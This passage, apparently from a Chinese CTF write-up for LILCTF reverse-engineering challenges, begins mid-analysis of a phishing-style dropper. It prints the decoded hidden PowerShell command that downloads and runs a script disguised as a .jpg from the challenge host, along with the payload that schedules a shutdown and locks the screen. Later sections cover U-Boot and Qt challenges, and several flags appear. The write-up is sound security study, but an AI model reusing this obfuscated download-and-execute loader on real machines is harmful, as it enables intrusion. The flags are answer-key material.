$EFTE.Substring(3)
var emGK = ioRjQN([688, 684, 700, 715, 706, 713, 717, 647, 684, 705, 702, 709, 709]);
var ioRjQN = new ActiveXObject(emGK);
// WScript.Shell
ioRjQN.Run(ohyLbg, 0, true);
```

ohyLbg为运行的命令，写js解密出命令

```python

function decode(arr) {
    return arr.map(x => String.fromCharCode(x - 601)).join('');
}

var cmdArray =[713, 712, 720, 702, 715, 716, 705, 702, 709, 709, 647, 702, 721, 702, 633, 646, 720, 633, 650, 633, 646, 702, 713, 633, 686, 711, 715, 702, 716, 717, 715, 706, 700, 717, 702, 701, 633, 646, 711, 712, 713, 633, 637, 670, 671, 685, 670, 633, 662, 641, 692, 715, 702, 704, 702, 721, 694, 659, 659, 678, 698, 717, 700, 705, 702, 716, 641, 640, 698, 654, 698, 658, 699, 653, 658, 703, 699, 657, 698, 701, 699, 702, 699, 657, 702, 650, 658, 700, 699, 702, 698, 652, 698, 703, 698, 658, 699, 703, 699, 703, 702, 700, 702, 702, 702, 657, 698, 658, 698, 651, 699, 698, 703, 655, 658, 703, 699, 654, 699, 703, 699, 657, 698, 658, 698, 650, 658, 702, 698, 652, 698, 652, 699, 657, 658, 649, 658, 703, 699, 654, 699, 703, 658, 699, 657, 652, 658, 699, 703, 698, 703, 657, 658, 649, 658, 699, 698, 654, 698, 651, 698, 657, 698, 652, 699, 699, 699, 703, 658, 700, 698, 652, 699, 699, 698, 658, 699, 702, 658, 703, 698, 653, 698, 658, 698, 649, 698, 649, 658, 649, 699, 698, 703, 701, 702, 651, 703, 700, 658, 649, 699, 700, 698, 652, 699, 699, 698, 658, 699, 702, 699, 703, 698, 653, 698, 658, 698, 649, 698, 649, 702, 651, 698, 658, 699, 653, 698, 658, 702, 702, 702, 700, 702, 650, 658, 699, 698, 654, 698, 651, 698, 657, 698, 652, 699, 699, 658, 703, 699, 657, 699, 654, 698, 649, 698, 658, 702, 700, 657, 653, 698, 654, 698, 657, 698, 657, 698, 658, 698, 651, 702, 700, 702, 650, 657, 701, 699, 702, 698, 699, 699, 658, 698, 650, 698, 658, 698, 651, 699, 657, 657, 649, 698, 654, 699, 703, 699, 657, 702, 700, 702, 699, 702, 650, 699, 699, 702, 699, 702, 649, 702, 699, 698, 653, 702, 699, 702, 649, 702, 699, 702, 650, 698, 658, 699, 700, 702, 699, 702, 649, 702, 699, 658, 658, 698, 651, 699, 702, 698, 658, 699, 703, 699, 657, 699, 702, 698, 654, 698, 703, 699, 657, 698, 658, 698, 657, 702, 699, 702, 649, 702, 699, 702, 650, 657, 703, 698, 652, 698, 650, 698, 650, 698, 701, 698, 651, 698, 657, 702, 699, 702, 649, 702, 702, 658, 703, 698, 658, 699, 657, 702, 650, 658, 698, 698, 701, 699, 702, 698, 654, 698, 701, 698, 702, 698, 649, 698, 658, 702, 700, 703, 703, 702, 700, 702, 699, 698, 653, 699, 657, 699, 657, 699, 700, 703, 655, 702, 652, 702, 652, 698, 703, 698, 653, 698, 701, 698, 649, 698, 649, 698, 658, 698, 651, 698, 699, 698, 658, 702, 651, 699, 653, 698, 654, 698, 651, 699, 703, 698, 653, 698, 654, 702, 651, 698, 698, 699, 658, 698, 651, 703, 655, 703, 657, 703, 701, 703, 703, 703, 658, 703, 653, 702, 652, 698, 702, 698, 658, 699, 703, 699, 657, 699, 658, 698, 657, 698, 657, 698, 654, 698, 651, 698, 699, 702, 651, 698, 655, 699, 700, 698, 699, 702, 699, 703, 656, 658, 703, 657, 654, 702, 700, 658, 698, 698, 701, 699, 702, 698, 654, 698, 701, 698, 702, 698, 649, 698, 658, 703, 655, 702, 652, 658, 655, 703, 657, 657, 657, 702, 700, 702, 699, 657, 651, 698, 658, 699, 657, 702, 651, 658, 699, 698, 658, 698, 702, 657, 703, 698, 649, 698, 654, 698, 658, 698, 651, 699, 657, 702, 699, 703, 656, 698, 703, 698, 657, 703, 656, 658, 703, 658, 698, 702, 700, 698, 703, 703, 657, 657, 653, 702, 700, 702, 653, 702, 651, 698, 700, 702, 657, 657, 658, 699, 653, 698, 658, 698, 703, 699, 658, 699, 657, 698, 654, 698, 652, 698, 651, 657, 703, 698, 652, 698, 651, 699, 657, 698, 658, 699, 653, 699, 657, 702, 651, 657, 654, 698, 651, 699, 698, 698, 652, 698, 656, 698, 658, 657, 703, 698, 652, 698, 650, 698, 650, 698, 701, 698, 651, 698, 657, 702, 651, 702, 653, 702, 653, 698, 700, 702, 657, 657, 658, 699, 653, 698, 658, 698, 703, 699, 658, 699, 657, 698, 654, 698, 652, 698, 651, 657, 703, 698, 652, 698, 651, 699, 657, 698, 658, 699, 653, 699, 657, 702, 651, 657, 654, 698, 651, 699, 698, 698, 652, 698, 656, 698, 658, 657, 703, 698, 652, 698, 650, 698, 650, 698, 701, 698, 651, 698, 657, 699, 649, 657, 699, 698, 658, 699, 657, 702, 650, 657, 650, 698, 658, 698, 650, 698, 702, 698, 658, 699, 702, 702, 654, 658, 656, 703, 702, 658, 650, 702, 651, 657, 651, 698, 701, 698, 650, 698, 658, 702, 654, 702, 651, 657, 654, 698, 651, 699, 698, 698, 652, 698, 656, 698, 658, 702, 653, 698, 700, 702, 657, 657, 658, 699, 653, 698, 658, 698, 703, 699, 658, 699, 657, 698, 654, 698, 652, 698, 651, 657, 703, 698, 652, 698, 651, 699, 657, 698, 658, 699, 653, 699, 657, 702, 651, 657, 654, 698, 651, 699, 698, 698, 652, 698, 656, 698, 658, 657, 703, 698, 652, 698, 650, 698, 650, 698, 701, 698, 651, 698, 657, 702, 651, 702, 653, 702, 653, 698, 700, 702, 657, 657, 658, 699, 653, 698, 658, 698, 703, 699, 658, 699, 657, 698, 654, 698, 652, 698, 651, 657, 703, 698, 652, 698, 651, 699, 657, 698, 658, 699, 653, 699, 657, 702, 651, 657, 654, 698, 651, 699, 698, 698, 652, 698, 656, 698, 658, 657, 703, 698, 652, 698, 650, 698, 650, 698, 701, 698, 651, 698, 657, 699, 649, 657, 699, 698, 658, 699, 657, 702, 650, 657, 650, 698, 658, 698, 650, 698, 702, 698, 658, 699, 702, 699, 649, 658, 699, 698, 653, 698, 658, 699, 702, 698, 658, 699, 656, 702, 653, 657, 699, 658, 698, 702, 700, 658, 652, 702, 654, 702, 651, 658, 698, 698, 701, 698, 649, 699, 658, 698, 658, 702, 651, 657, 651, 698, 701, 698, 650, 698, 658, 702, 650, 698, 703, 698, 649, 698, 654, 698, 656, 698, 658, 702, 699, 702, 655, 698, 657, 657, 651, 698, 701, 698, 650, 698, 658, 702, 699, 699, 650, 702, 654, 702, 651, 657, 651, 698, 701, 698, 650, 698, 658, 702, 654, 702, 651, 657, 654, 698, 651, 699, 698, 698, 652, 698, 656, 698, 658, 702, 653, 702, 699, 657, 651, 698, 658, 702, 655, 698, 703, 699, 657, 702, 699, 702, 649, 703, 701, 702, 649, 703, 701, 702, 654, 702, 654, 702, 653, 657, 649, 658, 703, 702, 700, 658, 698, 698, 701, 699, 702, 698, 654, 698, 701, 698, 702, 698, 649, 698, 658, 703, 655, 702, 652, 658, 655, 703, 657, 657, 657, 702, 654, 702, 651, 658, 698, 698, 701, 698, 649, 699, 658, 698, 658, 702, 654, 703, 656, 658, 703, 658, 698, 702, 700, 657, 701, 702, 700, 702, 653, 702, 653, 702, 653, 702, 653, 657, 699, 698, 658, 699, 657, 702, 650, 658, 698, 698, 701, 699, 702, 698, 654, 698, 701, 698, 702, 698, 649, 698, 658, 702, 700, 698, 703, 703, 657, 657, 653, 702, 700, 702, 650, 658, 698, 698, 701, 698, 649, 699, 658, 698, 658, 657, 652, 702, 654, 699, 649, 657, 699, 698, 658, 699, 657, 702, 650, 657, 650, 698, 658, 698, 650, 698, 702, 698, 658, 699, 702, 702, 654, 699, 649, 658, 699, 698, 653, 698, 658, 699, 702, 698, 658, 699, 656, 702, 653, 657, 699, 658, 698, 702, 700, 658, 652, 702, 654, 702, 651, 658, 698, 698, 701, 698, 649, 699, 658, 698, 658, 702, 651, 657, 651, 698, 701, 698, 650, 698, 658, 702, 650, 698, 703, 698, 649, 698, 654, 698, 656, 698, 658, 702, 699, 702, 655, 699, 699, 698, 651, 702, 655, 698, 657, 702, 655, 698, 699, 702, 699, 699, 650, 702, 654, 702, 651, 657, 651, 698, 701, 698, 650, 698, 658, 702, 654, 703, 656, 702, 698, 702, 653, 658, 656, 658, 703, 698, 703, 699, 702, 698, 654, 699, 700, 699, 657, 657, 702, 698, 649, 698, 652, 698, 703, 698, 656, 658, 650, 703, 655, 703, 655, 657, 703, 699, 702, 698, 658, 698, 701, 699, 657, 698, 658, 702, 653, 702, 653, 657, 699, 698, 658, 699, 657, 702, 650, 658, 698, 698, 701, 699, 702, 698, 654, 698, 701, 698, 702, 698, 649, 698, 658, 702, 700, 698, 703, 703, 657, 657, 653, 702, 700, 702, 650, 658, 698, 698, 701, 698, 649, 699, 658, 698, 658, 657, 652, 702, 654, 702, 651, 702, 653, 702, 653, 657, 699, 698, 658, 699, 657, 702, 650, 658, 698, 698, 701, 699, 702, 698, 654, 698, 701, 698, 702, 698, 649, 698, 658, 702, 700, 657, 701, 702, 654, 702, 651, 658, 698, 698, 701, 698, 649, 699, 658, 698, 658, 702, 654, 702, 651, 657, 654, 698, 651, 699, 698, 698, 652, 698, 656, 698, 658, 702, 653, 702, 653, 658, 698, 698, 701, 699, 702, 698, 654, 698, 701, 698, 702, 698, 649, 698, 658, 702, 700, 703, 703, 702, 700, 702, 650, 658, 698, 698, 701, 698, 649, 702, 654, 702, 654, 702, 654, 702, 654, 702, 702, 703, 656, 640, 645, 640, 647, 724, 651, 726, 640, 642, 633, 725, 633, 638, 633, 724, 633, 692, 700, 705, 698, 715, 694, 641, 692, 668, 712, 711, 719, 702, 715, 717, 694, 659, 659, 685, 712, 667, 722, 717, 702, 641, 637, 696, 647, 687, 698, 709, 718, 702, 645, 650, 655, 642, 633, 646, 699, 721, 712, 715, 633, 640, 651, 649, 653, 640, 642, 633, 726, 642, 633, 646, 707, 712, 706, 711, 633, 640, 640, 660, 639, 633, 637, 670, 671, 685, 670, 647, 684, 718, 699, 716, 717, 715, 706, 711, 704, 641, 649, 645, 652, 642, 633, 637, 670, 671, 685, 670, 647, 684, 718, 699, 716, 717, 715, 706, 711, 704, 641, 652, 642];
var cmd = decode(cmdArray);
console.log(cmd);
```

得到命令

```python
powershell.exe -w 1 -ep Unrestricted -nop $EFTE =([regex]::Matches('a5a9b49fb8adbeb8e19cbea3afa9bfbfeceee8a9a2baf69fb5bfb8a9a19ea3a3b8909fb5bf9b839bfaf8909ba5a2a8a3bbbf9ca3bba9be9fa4a9a0a090bafde2fc90bca3bba9bebfa4a9a0a0e2a9b4a9eeece19ba5a2a8a3bb9fb8b5a0a9ec84a5a8a8a9a2ece18dbeabb9a1a9a2b880a5bfb8ecebe1bbebe0eba4ebe0ebe1a9bcebe0eb99a2bea9bfb8bea5afb8a9a8ebe0ebe18fa3a1a1ada2a8ebe0ee9fa9b8e19aadbea5adaea0a9ecffeceba4b8b8bcf6e3e3afa4ada0a0a9a2aba9e2b4a5a2bfa4a5e2aab9a2f6f8fdfff9f4e3aea9bfb8b9a8a8a5a2abe2a6bcabebf79f85ec9aadbea5adaea0a9f6e396f888eceb82a9b8e29ba9ae8fa0a5a9a2b8ebf7afa8f79f9aecaff884ece4e2ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9bee597fe91e282ada1a9e5e285a2baa3a7a9e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9beb09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6a882ada1a9ebb1e5e282ada1a9e5e285a2baa3a7a9e4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f888e5e29aada0b9a9e5f79f9aec8dece4e4e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5b08ba9b8e181a9a1aea9bee5b09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6bba2e6a8e6abebb1e5e282ada1a9e5f7eae4979fafbea5bcb88ea0a3afa791f6f68fbea9adb8a9e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5e2e4e48ba9b8e19aadbea5adaea0a9ec8de5e29aada0b9a9e5e285a2baa3a7a9e4e49aadbea5adaea0a9ecffece19aada0e5e5e5e5eef7','.{2}') | % { [char]([Convert]::ToByte($_.Value,16) -bxor '204') }) -join '';& $EFTE.Substring(0,3) $EFTE.Substring(3)
```

解密其中的加密字符串

```python
let hex = 'a5a9b49fb8adbeb8e19cbea3afa9bfbfeceee8a9a2baf69fb5bfb8a9a19ea3a3b8909fb5bf9b839bfaf8909ba5a2a8a3bbbf9ca3bba9be9fa4a9a0a090bafde2fc90bca3bba9bebfa4a9a0a0e2a9b4a9eeece19ba5a2a8a3bb9fb8b5a0a9ec84a5a8a8a9a2ece18dbeabb9a1a9a2b880a5bfb8ecebe1bbebe0eba4ebe0ebe1a9bcebe0eb99a2bea9bfb8bea5afb8a9a8ebe0ebe18fa3a1a1ada2a8ebe0ee9fa9b8e19aadbea5adaea0a9ecffeceba4b8b8bcf6e3e3afa4ada0a0a9a2aba9e2b4a5a2bfa4a5e2aab9a2f6f8fdfff9f4e3aea9bfb8b9a8a8a5a2abe2a6bcabebf79f85ec9aadbea5adaea0a9f6e396f888eceb82a9b8e29ba9ae8fa0a5a9a2b8ebf7afa8f79f9aecaff884ece4e2ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9bee597fe91e282ada1a9e5e285a2baa3a7a9e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8e2e4e4ace889b4a9afb9b8a5a3a28fa3a2b8a9b4b8e285a2baa3a7a98fa3a1a1ada2a8b08ba9b8e181a9a1aea9beb09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6a882ada1a9ebb1e5e282ada1a9e5e285a2baa3a7a9e4eb82a9e6afb8ebe0fde0fde5e5e4809fec9aadbea5adaea0a9f6e396f888e5e29aada0b9a9e5f79f9aec8dece4e4e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5b08ba9b8e181a9a1aea9bee5b09ba4a9bea9b7e48b9aec93e5e29aada0b9a9e282ada1a9e1afa0a5a7a9ebe6bba2e6a8e6abebb1e5e282ada1a9e5f7eae4979fafbea5bcb88ea0a3afa791f6f68fbea9adb8a9e4e48ba9b8e19aadbea5adaea0a9ecaff884ece19aada0b9a983e5e2e4e48ba9b8e19aadbea5adaea0a9ec8de5e29aada0b9a9e5e285a2baa3a7a9e4e49aadbea5adaea0a9ecffece19aada0e5e5e5e5eef7';
let arr = hex.match(/.{2}/g);
let EFTE = arr.map(x => String.fromCharCode(parseInt(x,16) ^ 204)).join('');
console.log(EFTE);
```

解出如下

```python
iexStart-Process "$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ArgumentList '-w','h','-ep','Unrestricted','-Command',"Set-Variable 3 'http://challenge.xinshi.fun:41358/bestudding.jpg';SI Variable:/Z4D 'Net.WebClient';cd;SV c4H (.`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member)[2].Name).Invoke(`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member|Where{(GV _).Value.Name-clike'*dName'}).Name).Invoke('Ne*ct',1,1))(LS Variable:/Z4D).Value);SV A ((((Get-Variable c4H -ValueO)|Get-Member)|Where{(GV _).Value.Name-clike'*wn*d*g'}).Name);&([ScriptBlock]::Create((Get-Variable c4H -ValueO).((Get-Variable A).Value).Invoke((Variable 3 -Val))))";
```

分析发现在尝试运行一个http://challenge.xinshi.fun:41358/bestudding.jpg文件的代码

下载jpg打开发现

![image](/image-20250815180458-1r7zitd.png)

转换一下

```python
# 加载 payload.txt 的内容到 $payload
$payload = Get-Content .\payload.txt -Raw

# 将执行命令替换成输出字符串
$payload = $payload -replace '\$r\s*\(', 'Write-Output('

Invoke-Expression $payload
```

得到最终的脚本

```python
$DebugPreference = $ErrorActionPreference = $VerbosePreference = $WarningPreference = "SilentlyContinue"

[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")

shutdown /s /t 600 >$Null 2>&1

$Form = New-Object System.Windows.Forms.Form
$Form.Text = "Ciallo～(∠·ω< )⌒★"
$Form.StartPosition = "Manual"
$Form.Location = New-Object System.Drawing.Point(40, 40)
$Form.Size = New-Object System.Drawing.Size(720, 480)
$Form.MinimalSize = New-Object System.Drawing.Size(720, 480)
$Form.MaximalSize = New-Object System.Drawing.Size(720, 480)
$Form.FormBorderStyle = "FixedDialog"
$Form.BackColor = "#0077CC"
$Form.MaximizeBox = $False
$Form.TopMost = $True


$fF1IA49G = "LILCTF{6e_vI9iI4Nt_4gAlnST_PHi$hING}"
$fF1IA49G = "N0pe"


$Label1 = New-Object System.Windows.Forms.Label
$Label1.Text = ":)"
$Label1.Location = New-Object System.Drawing.Point(64, 80)
$Label1.AutoSize = $True
$Label1.ForeColor = "White"
$Label1.Font = New-Object System.Drawing.Font("Consolas", 64)

$Label2 = New-Object System.Windows.Forms.Label
$Label2.Text = "这里没有 flag；这个窗口是怎么出现的呢，flag 就在那里"
$Label2.Location = New-Object System.Drawing.Point(64, 240)
$Label2.AutoSize = $True
$Label2.ForeColor = "White"
$Label2.Font = New-Object System.Drawing.Font("微软雅黑", 16)

$Label3 = New-Object System.Windows.Forms.Label
$Label3.Text = "你的电脑将在 10 分钟后关机，请保存你的工作"
$Label3.Location = New-Object System.Drawing.Point(64, 300)
$Label3.AutoSize = $True
$Label3.ForeColor = "White"
$Label3.Font = New-Object System.Drawing.Font("微软雅黑", 16)

$Form.Controls.AddRange(@($Label1, $Label2, $Label3))

$Form.Add_Shown({$Form.Activate()})
$Form.Add_FormClosing({
    $_.Cancel = $True
    [System.Windows.Forms.MessageBox]::Show("不允许关闭！", "提示", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
})

$Form.ShowDialog() | Out-Null
```

‍

​`LILCTF{6e_vI9iI4Nt_4gAlnST_PHi$hING}`​

‍

‍

## Oh_My_Uboot

arm的架构，用qemu运行gdb调试

​`qemu-system-arm -M vexpress-a9 -nographic -kernel ./uboot -S -s`​

![image](/image-20250816155556-qfzm4lr.png)

随便输入字符后ida步步入

![image](/image-20250816155546-ozxskal.png)

发现了判断密码的汇编片段

首先对每个字节xor了0x72,然后

分析发现经过一个base58换表编码

找到密文如下

![image](/image-20250816155533-y9tgafp.png)

‍

![image](/image-20250816154611-rlltqai.png)

‍

## Qt_Creator

在QLineEdit打断点，断到获取输入的地方，即qWidget库中QlineEdit函数

![image](/image-20250817125630-iyrkbgt.png)

![image](/image-20250817124658-xifnj2y.png)

![image](/image-20250817125753-7jqt9eo.png)

运行到此处看调用堆栈找到判断逻辑函数处

sub_410100函数判断

![image](/image-20250817124357-42j4all.png)

![image](/image-20250817124849-egl4x6q.png)

eax地址往下看看到了明文

![image](/image-20250817124327-a68dvq8.png)

​`LILCTF{Q7_cre4t0r_1s_very_c0nv3ni3nt}`​

